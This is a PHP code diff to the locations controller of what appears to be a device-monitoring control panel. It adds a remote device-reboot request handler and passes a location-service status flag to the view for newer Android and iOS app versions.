@@ -22,19 +22,40 @@ class Locations extends BaseModuleController
 
     public function indexAction()
     {
+        
+        if ($this->getRequest()->hasGet('rebootDevice')) {
+            $settingsModel = new \Models\Cp\Settings($this->di);
+            
+            $this->checkDemo($this->di['router']->getRouteUrl('locations'));
+
+            $settingsModel->setRebootDevice($this->di['devId']);
+
+            $this->di['flashMessages']->add(FlashMessages::SUCCESS, $this->di['t']->_('Request to reboot device has been successfully sent!'));
+
+            $this->redirect($this->di['router']->getRouteUrl('locations'));
+        }
+        
         if ($this->di['currentDevice']['os'] == 'icloud') {
             $this->icloud();
         } else {
             $locations = new \Models\Cp\Locations($this->di);
-
+            $settingsModel = new \Models\Cp\Settings($this->di);
+            $settings = $settingsModel->getDeviceSettings($this->di['devId']);
+            
+            if (($this->di['currentDevice']['os'] === 'android' && $this->di['currentDevice']['app_version'] > 6) ||
+                ($this->di['currentDevice']['os'] === 'ios' && $this->di['currentDevice']['app_version'] > 5)) {
+                $this->view->serviceLocation = $settings['location_service_enabled'];
+            } 
+            
             if ($this->getRequest()->isAjax()) {
                 $this->makeJSONResponse($locations->getDayPoints($this->di['devId'], $this->getRequest()->get('dayStart', 0)));
             }
 
             $this->view->startTime = $locations->getLastPointTimestamp($this->di['devId']);
-            $this->view->hasZones = $locations->hasZones($this->di['devId']);
-
+            $this->view->hasZones = $locations->hasZones($this->di['devId']);      
+            
             $this->setView('cp/locations/index.htm');
+            
         }
     }
 
